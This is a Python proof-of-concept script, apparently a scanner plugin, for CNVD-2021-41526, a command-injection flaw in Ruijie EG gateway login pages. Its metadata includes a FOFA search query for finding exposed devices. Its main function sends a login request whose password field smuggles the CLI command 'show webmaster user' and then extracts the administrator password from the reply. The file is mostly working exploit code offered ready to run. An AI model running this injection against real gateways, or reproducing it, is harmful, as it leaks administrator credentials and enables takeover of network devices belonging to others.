# -*- coding: UTF-8 -*-
# !/usr/bin/python
import requests
import re


def vuln_info():
    info = {
        'vuln_name': '锐捷EG易网关管理员账号密码泄露漏洞',
        'vuln_referer': 'http://wiki.peiqi.tech/',
        'vuln_author': 'Bob',
        'cms_name': '锐捷',
        'vuln_description': '''锐捷EG易网关login.php存在CLI命令注入，导致管理员账号密码泄露漏洞''',
        'vuln_identifier': '''CNVD-2021-41526''',
        'vuln_class': '远程命令执行',
        'vuln_solution': '''建议相关用户尽快联系官方对受影响范围内的设备系统进行升级，官方链接：http://www.ruijie.com.cn''',
        'FofaQuery_type': 'socket',
        'FofaQuery_link': 'all',
        'FofaQuery_rule': 'app="Ruijie-EG易网关"',
        # header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        # header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc': 1,
        'isexp': 0
    }
    return info


def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    result = {"Result":False,"Result_Info":""}
    vuln_url = url + "/login.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password=admin?show+webmaster+user'

    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        # print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(url))
        if "data" in response.text and response.status_code == 200:
            try:
                password = re.findall(r'admin (.*?)"', response.text)[0]
                result['Result'] = True
                result['Result_Info'] = "账号密码为:admin/"+password
            except:
                result['Result_Info'] = "正则匹配失败，请手工验证！"
        else:
            result['Result_Info'] = "不存在"
    except Exception as e:
        func_out('Error',str(e) + str(e.__traceback__.tb_lineno) + '行')
    return result


if __name__ == '__main__':
    url = 'http://xxx/'
    aa = do_poc(url, '', '', '', heads={})
    print(aa)
